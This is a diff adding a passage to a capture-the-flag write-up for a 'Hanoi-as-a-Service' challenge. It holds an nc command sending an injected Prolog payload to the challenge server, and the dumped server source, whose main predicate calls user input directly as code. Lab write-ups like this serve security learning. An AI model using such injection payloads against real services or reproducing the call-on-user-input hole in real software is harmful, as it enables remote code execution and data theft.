@@ -187,7 +187,97 @@ After converting the flag from decimal to ascii the flag was revealed!
 ```
 flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
 ```
+For those who are interested, here is the code I was able to dump that was running "hanoi()".
+```
+root@kali:~# echo '2), listing %'|nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+* Move top disk from a to c
+* Move top disk from a to b
+* Move top disk from c to b
 
+dohanoi(0, _, _, _) :- !.
+dohanoi(A, C, E, D) :- !,
+	B is A+ -1,
+	dohanoi(B, C, D, E),
+	moveit(C, E),
+	dohanoi(B, D, E, C).
+
+hanoi(A) :-
+	A<15,
+	dohanoi(A, a, b, c).
+hanoi(A) :-
+	A>=15,
+	write('Hey, this problem is too big for my poor mind...'),
+	nl.
+
+:- multifile prolog_clause_name/2.
+
+
+:- dynamic prolog_exception_hook/4.
+:- multifile prolog_exception_hook/4.
+
+prolog_exception_hook(error(A, context(D, B)), error(A, context(prolog_stack(I), B)), G, C) :-
+    prolog_stack:
+    (   (   C==none
+	->  stack_guard(none)
+	;   prolog_frame_attribute(C, predicate_indicator, E),
+	    debug(backtrace,
+		  'Got exception ~p (Ctx0=~p, Catcher=~p)',
+		  [A, D, E]),
+	    stack_guard(E)
+	),
+	(   current_prolog_flag(backtrace_depth, F)
+	->  F>0
+	;   F=20
+	),
+	get_prolog_backtrace(G, F, H),
+	debug(backtrace, 'Stack = ~p', [H]),
+	clean_stack(H, I)
+    ).
+
+:- dynamic resource/3.
+:- multifile resource/3.
+
+
+first(A, [A|_]).
+
+:- multifile prolog_list_goal/1.
+
+
+:- thread_local thread_message_hook/3.
+:- dynamic thread_message_hook/3.
+:- volatile thread_message_hook/3.
+
+
+:- multifile prolog_predicate_name/2.
+
+
+moveit(A, B) :-
+	print('* Move top disk from '),
+	print(A),
+	print(' to '),
+	print(B),
+	nl.
+
+main :-
+	A=[104, 97, 110, 111, 105, 40],
+	D=[41],
+	write('Welcome to the Hanoi-as-a-Service cloud platform!'),
+	nl,
+	write('How many disks does your tower have?'),
+	nl,
+	read_line_to_codes(user_input, B),
+	append(A, B, C),
+	append(C, D, E),
+	string_to_atom(E, F),
+	read_term_from_atom(F, G, []),
+	call(G),
+	halt(0).
+
+:- multifile message_property/2.
+
+```
 
 
 ---
